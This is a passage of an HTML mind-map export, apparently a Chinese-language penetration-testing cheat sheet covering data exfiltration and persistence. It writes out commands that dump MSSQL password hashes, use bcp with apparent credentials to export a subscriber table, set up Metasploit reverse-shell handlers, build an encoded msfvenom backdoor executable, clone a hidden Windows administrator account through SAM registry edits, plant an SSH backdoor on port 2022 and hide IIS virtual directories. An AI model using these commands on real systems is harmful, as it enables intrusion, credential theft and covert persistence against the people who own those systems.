+<li><span id="show1_89" class="foldclosed" onClick="show_folder('1_89')" style="POSITION: absolute">+</span> <span id="hide1_89" class="foldopened" onClick="hide_folder('1_89')">-</span>
+<span style="color: #111111;">SubInACL</span>
+<ul id="fold1_89" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">https://www.microsoft.com/en-us/download/details.aspx?id=23510</span>
+
+</li>
+
+</ul>
+</li>
+<li><span id="show1_90" class="foldclosed" onClick="show_folder('1_90')" style="POSITION: absolute">+</span> <span id="hide1_90" class="foldopened" onClick="hide_folder('1_90')">-</span>
+Sysinternals Suite
+<ul id="fold1_90" style="POSITION: relative; VISIBILITY: visible;"><li>https://technet.microsoft.com/en-us/sysinternals/bb842062.aspx
+
+</li>
+
+</ul>
+</li>
+
+</ul>
+</li>
+
+</ul>
+</li>
+<li><span id="show1_91" class="foldclosed" onClick="show_folder('1_91')" style="POSITION: absolute">+</span> <span id="hide1_91" class="foldopened" onClick="hide_folder('1_91')">-</span>
+<span style="color: #990000;font-size: 116%;font-family: SansSerif, sans-serif; ">Mail&#26381;&#21153;&#22120;</span>
+<ul id="fold1_91" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">Exchange Server</span>
+<ul><li><span style="color: #111111;">&#23548;&#20986;&#37038;&#20214;</span>
+
+</li>
+
+</ul>
+</li>
+
+</ul>
+</li>
+<li><span style="color: #990000;font-size: 116%;font-family: SansSerif, sans-serif; ">&#25968;&#25454;&#24211;</span>
+<ul><li><span style="color: #111111;">Mysql</span>
+
+</li>
+<li><span id="show1_92" class="foldclosed" onClick="show_folder('1_92')" style="POSITION: absolute">+</span> <span id="hide1_92" class="foldopened" onClick="hide_folder('1_92')">-</span>
+<span style="color: #111111;">Oracle</span>
+<ul id="fold1_92" style="POSITION: relative; VISIBILITY: visible;"><li><span id="show1_92_1" class="foldclosed" onClick="show_folder('1_92_1')" style="POSITION: absolute">+</span> <span id="hide1_92_1" class="foldopened" onClick="hide_folder('1_92_1')">-</span>
+<span style="color: #111111;">&#23458;&#25143;&#31471;</span>
+<ul id="fold1_92_1" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">phporaadmin-0.4.5</span>
+
+</li>
+<li>OraBone
+
+</li>
+<li>OraCmd
+
+</li>
+
+</ul>
+</li>
+
+</ul>
+</li>
+<li><span id="show1_93" class="foldclosed" onClick="show_folder('1_93')" style="POSITION: absolute">+</span> <span id="hide1_93" class="foldopened" onClick="hide_folder('1_93')">-</span>
+<span style="color: #111111;">Microsoft&#174; SQL Server</span>
+<ul id="fold1_93" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">sqlcmd</span>
+<ul><li><p><span style="color: #111111;">&#23548;&#20986;mssql&#25968;&#25454;&#24211;hash
+<br>
+sqlcmd -d master -Q "select name,password_hash from sys.sql_logins" 
+<br>
+&#23519;&#30475;&#29256;&#26412;&#21495;
+<br>
+sqlcmd -d master -Q "select @@version "</span>
+</li>
+</ul>
+</li>
+<li><span style="color: #111111;">BCP</span>
+<ul><li><p><span style="color: #111111;">bcp "select * from dtacdata.dbo.subscriber order by swon_date desc" query out k:/recycler/dh_new &nbsp;-U"ifmsa" -P"infoma" -c</span>
+</li>
+</ul>
+</li>
+<li><span style="color: #111111;">SQL&#35821;&#21477;</span>
+
+</li>
+
+</ul>
+</li>
+<li><span id="show1_94" class="foldclosed" onClick="show_folder('1_94')" style="POSITION: absolute">+</span> <span id="hide1_94" class="foldopened" onClick="hide_folder('1_94')">-</span>
+<span style="color: #111111;">&#20854;&#20182;</span>
+<ul id="fold1_94" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">&#33719;&#21462;&#26368;&#21518;&#20960;&#26465;&#35760;&#24405;
+<br>
+SELECT LAST(column_name) FROM table_name;
+<br>
+&#27880;&#37322;&#65306;&#21482;&#26377; MS Access &#25903;&#25345;&nbsp;LAST() &#20989;&#25968;&#12290;
+<br>
+
+<br>
+SQL Server &#35821;&#27861;
+<br>
+SELECT TOP 1 column_name FROM table_name ORDER BY column_name DESC;
+<br>
+
+<br>
+MySQL &#35821;&#27861;
+<br>
+SELECT column_name FROM table_name ORDER BY column_name DESC LIMIT 1;
+<br>
+
+<br>
+Oracle &#35821;&#27861;
+<br>
+SELECT column_name FROM table_name ORDER BY column_name DESC WHERE ROWNUM &lt;=1;</span>
+</li>
+</ul>
+</li>
+
+</ul>
+</li>
+<li><span style="color: #990000;font-size: 116%;font-family: SansSerif, sans-serif; ">&#26381;&#21153;&#22120;</span>
+<ul><li><span style="color: #111111;">&#23548;&#20986;&#26085;&#24535;</span>
+
+</li>
+
+</ul>
+</li>
+
+</ul>
+</li>
+<li><span style="color: #00b439;font-size: 133%;font-family: SansSerif, sans-serif; ">&#25345;&#20037;&#21270;</span>
+<ul><li><span style="color: #990000;font-size: 116%;font-family: SansSerif, sans-serif; ">&#36828;&#25511;</span>
+<ul><li>CS
+
+</li>
+
+</ul>
+</li>
+<li><span style="color: #990000;font-size: 116%;font-family: SansSerif, sans-serif; ">msf</span>
+<ul><li><span id="show1_95" class="foldclosed" onClick="show_folder('1_95')" style="POSITION: absolute">+</span> <span id="hide1_95" class="foldopened" onClick="hide_folder('1_95')">-</span>
+<span style="color: #111111;">&#37197;&#32622;</span>
+<ul id="fold1_95" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">&#21551;&#21160;&#25968;&#25454;&#24211;
+<br>
+service postgresql start
+<br>
+&#21021;&#22987;&#21270;&#25968;&#25454;&#24211;
+<br>
+msfdb init
+<br>
+&#26597;&#30475;&#25968;&#25454;&#24211;&#36830;&#25509;&#29366;&#24577;
+<br>
+msf &gt; db_status
+<br>
+[*] postgresql connected to msf
+<br>
+
+<br>
+&#21019;&#24314;&#26032;&#30340;&#25968;&#25454;&#24211;&#36134;&#25143;
+<br>
+#su postgres
+<br>
+#createuser username ruo -P
+<br>
+
+<br>
+&#21551;&#21160;msfrpcd
+<br>
+msfrpcd -U msf -P test -f -S -a 127.0.0.1
+<br>
+
+<br>
+&#36830;&#25509;&#25968;&#25454;&#24211;
+<br>
+msf&gt;db_connect msf:pass123@127.0.0.1:5432/msf
+<br>
+
+<br>
+</span>
+</li>
+</ul>
+</li>
+<li><span id="show1_96" class="foldclosed" onClick="show_folder('1_96')" style="POSITION: absolute">+</span> <span id="hide1_96" class="foldopened" onClick="hide_folder('1_96')">-</span>
+<span style="color: #111111;">&#21453;&#24377;shell</span>
+<ul id="fold1_96" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">&#21019;&#24314;&#30417;&#21548;&#22120;&#25991;&#20214;
+<br>
+cat reverse_resource.rc
+<br>
+use exploit/multi/handler
+<br>
+set PAYLOAD windows/meterpreter/reverse_tcp
+<br>
+set LHOST 192.168.228.128 &nbsp;&#61663;&nbsp;&#25915;&#20987;&#26426;IP
+<br>
+set ExitSession false
+<br>
+exploit -j -z
+<br>
+
+<br>
+&#21551;&#21160;&#30417;&#21548;&#22120;
+<br>
+msfconsole -r reverse_resource.rc
+<br>
+
+<br>
+&#21019;&#24314;&#26381;&#21153;&#31471;
+<br>
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp lhost=192.168.6.12 lport=80 EXITFUNC=thread -e x86/shikata_ga_nai -b '\x00' -i 3 -f exe -o /tmp/bdoor.exe
+<br>
+
+<br>
+&#29983;&#25104;shellcode
+<br>
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp lhost=192.168.6.12 lport=3050 -e generic/none -f c
+<br>
+
+<br>
+
+<br>
+</span>
+</li>
+</ul>
+</li>
+<li><span style="color: #111111;">&#37197;&#32622;</span>
+
+</li>
+
+</ul>
+</li>
+<li>&#21518;&#38376;
+<ul><li>Shim
+<ul><li>http://www.4hou.com/technology/760.html
+
+</li>
+
+</ul>
+</li>
+<li><span id="show1_97" class="foldclosed" onClick="show_folder('1_97')" style="POSITION: absolute">+</span> <span id="hide1_97" class="foldopened" onClick="hide_folder('1_97')">-</span>
+Windows&#36134;&#21495;&#20811;&#38534;
+<ul id="fold1_97" style="POSITION: relative; VISIBILITY: visible;"><li><p>1) &#26032;&#24314;&#36134;&#21495;
+<br>
+net user test$ 112233@ab &nbsp;/add /y /expires:never
+<br>
+net localgroup administrators test$ /add
+<br>
+
+<br>
+2) &#26597;&#35810;test$&#29992;&#25143;&#30340;&#31867;&#22411;&#65288;0x3e9&#65289;
+<br>
+reg export &nbsp;HKEY_LOCAL_MACHINE\SAM\SAM\DOMAINS\Account\Users\Names\test$ 1.reg
+<br>
+
+<br>
+3) &#23548;&#20986;&#31649;&#29702;&#21592;000001F4&#39033;&#65292;&#24182;&#29992;1F4&#30340;F&#20540;&#26367;&#25442;3E9&#30340;F&#20540;
+<br>
+reg export HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4 adminF.reg
+<br>
+
+<br>
+4) &nbsp;&#21024;&#38500;&#29992;&#25143;&#24182;&#23548;&#20837;1&#65292;2&#27880;&#20876;&#34920;&#25991;&#20214;
+<br>
+net user test$ /del
+<br>
+regedit /s 1.reg
+<br>
+regedit /s &nbsp;&#26367;&#25442;&#21518;&#30340;3E9&#39033;.reg
+<br>
+5) &#31105;&#27490;&#26174;&#31034;&#19978;&#27425;&#30331;&#24405;&#21517;
+<br>
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DontDisplayLastUserName /t REG_SZ /d 1 /f 
+</li>
+</ul>
+</li>
+<li>&#26080;&#25991;&#20214;
+
+</li>
+<li><span id="show1_98" class="foldclosed" onClick="show_folder('1_98')" style="POSITION: absolute">+</span> <span id="hide1_98" class="foldopened" onClick="hide_folder('1_98')">-</span>
+SSH
+<ul id="fold1_98" style="POSITION: relative; VISIBILITY: visible;"><li><span id="show1_98_1" class="foldclosed" onClick="show_folder('1_98_1')" style="POSITION: absolute">+</span> <span id="hide1_98_1" class="foldopened" onClick="hide_folder('1_98_1')">-</span>
+openssh
+<ul id="fold1_98_1" style="POSITION: relative; VISIBILITY: visible;"><li>http://core.ipsecs.com/
+
+</li>
+
+</ul>
+</li>
+<li>tsh
+<ul><li>https://github.com/orangetw/tsh
+
+</li>
+
+</ul>
+</li>
+<li>SSH Server wrapper
+<ul><li>http://www.jakoblell.com/blog/2014/05/07/hacking-contest-ssh-server-wrapper/
+
+</li>
+
+</ul>
+</li>
+<li>&#36719;&#38142;&#25509;
+<ul><li># ln -sf /usr/sbin/sshd /tmp/su;nohup /tmp/su -oPort=2022 &amp;
+
+</li>
+
+</ul>
+</li>
+<li>pam
+
+</li>
+<li>&#31471;&#21475;&#22797;&#29992;
+
+</li>
+
+</ul>
+</li>
+<li><span id="show1_99" class="foldclosed" onClick="show_folder('1_99')" style="POSITION: absolute">+</span> <span id="hide1_99" class="foldopened" onClick="hide_folder('1_99')">-</span>
+IIS
+<ul id="fold1_99" style="POSITION: relative; VISIBILITY: visible;"><li><span id="show1_99_1" class="foldclosed" onClick="show_folder('1_99_1')" style="POSITION: absolute">+</span> <span id="hide1_99_1" class="foldopened" onClick="hide_folder('1_99_1')">-</span>
+<span style="color: #111111;">Appcmd.exe (IIS 7)</span>
+<ul id="fold1_99_1" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">Applies To: Windows 7, Windows Server 2008, Windows Server 2008 R2, Windows Vista
+<br>
+IIS&#160;7 provides a new command-line tool, Appcmd.exe, to configure and query objects on your Web server, and to return output in text or XML. The following examples are tasks that you can complete with Appcmd.exe:
+<br>
+*Create and configure sites, applications, application pools, and virtual directories.
+<br>
+*Start and stop sites.
+<br>
+*Start, stop, and recycle application pools.
+<br>
+*View information about worker processes and requests that are running on the Web server.
+<br>
+
+<br>
+To add an application to a site, use the following syntax:
+<br>
+appcmd add app /site.name:&#160;string&#160;/path:&#160;string&#160;/physicalPath:&#160;string
+<br>
+The variable&#160;site.namestring&#160;is the name of the Web site to which you want to add the application. The variable&#160;pathstring&#160;is the virtual path of the application, such as&#160;/application, and&#160;physicalPathstring&#160;is the physical path of the application's content in the file system.
+<br>
+For example, to add an application named&#160;marketing&#160;to a site named&#160;contoso, with content at&#160;c:\application, type the following at the command prompt, and then press ENTER:
+<br>
+appcmd add app /site.name:&#160;contoso&#160;/path:/&#160;marketing&#160;/physicalPath:c:\&#160;application
+<br>
+
+<br>
+appcmd list site (&#21015;&#20986;&#24403;&#21069;&#23384;&#22312;&#30340;&#31449;&#28857;)
+<br>
+&#34394;&#25311;&#30446;&#24405;&#24517;&#39035;&#26159;&#20108;&#32423;,IIS&#25511;&#21046;&#21488;&#25165;&#26080;&#27861;&#30475;&#21040;
+<br>
+
+<br>
+&#28155;&#21152;&#34394;&#25311;&#30446;&#24405;
+<br>
+%windir%\system32\inetsrv\appcmd add vdir /app.name:"Default Web Site/" /path:/cache/tmp /physicalPath:"C:\Program Files\IIS\Microsoft Web Deploy"
+<br>
+&#21015;&#20986;&#34394;&#25311;&#30446;&#24405;
+<br>
+%windir%\system32\inetsrv\appcmd list vdir /app.name:"Default Web Site/"
+<br>
+&#21024;&#38500;&#34394;&#25311;&#30446;&#24405;
+<br>
+%windir%\system32\inetsrv\appcmd delete vdir "Default Web Site/cache/tmp"
+<br>
+
+<br>
+http://www.windowsnetworking.com/articles-tutorials/windows-server-2008/Configuring-IIS-7-command-line-Appcmdexe-Part1.html</span>
+</li>
+</ul>
+</li>
+
+</ul>
+</li>
+<li>webshell
+
+</li>
+
+</ul>
+</li>
+
+</ul>
+</li>
+<li><span style="color: #00b439;font-size: 133%;font-family: SansSerif, sans-serif; ">&#20449;&#24687;&#25910;&#38598;</span>
+
+</li>
+<li><span id="show1_100" class="foldclosed" onClick="show_folder('1_100')" style="POSITION: absolute">+</span> <span id="hide1_100" class="foldopened" onClick="hide_folder('1_100')">-</span>
+<span style="color: #00b439;font-size: 133%;font-family: SansSerif, sans-serif; ">&#30456;&#20851;&#36164;&#26009;</span>
+<ul id="fold1_100" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #990000;font-size: 116%;font-family: SansSerif, sans-serif; ">&#25968;&#25454;&#20998;&#26512;&#21464;&#38761;</span>
+
+</li>
+<li><span style="color: #990000;font-size: 116%;font-family: SansSerif, sans-serif; ">&#20449;&#24687;&#23384;&#20648;&#19982;&#31649;&#29702;</span>
+
+</li>
+<li><span style="color: #990000;font-size: 116%;font-family: SansSerif, sans-serif; ">metasploit&#28183;&#36879;&#27979;&#35797;&#25351;&#21335;</span>
+
+</li>
+<li><span style="color: #990000;font-size: 116%;font-family: SansSerif, sans-serif; ">&#25968;&#25454;&#24211;&#40657;&#23458;&#22823;&#26333;&#20809;</span>
+
+</li>
+<li>OTHERS
+
+</li>
+
+</ul>
+</li>
+
+</ul>
+</li>
+
+</ul><SCRIPT type="text/javascript">
+fold_document();
+</SCRIPT>
+</body>
+</html>
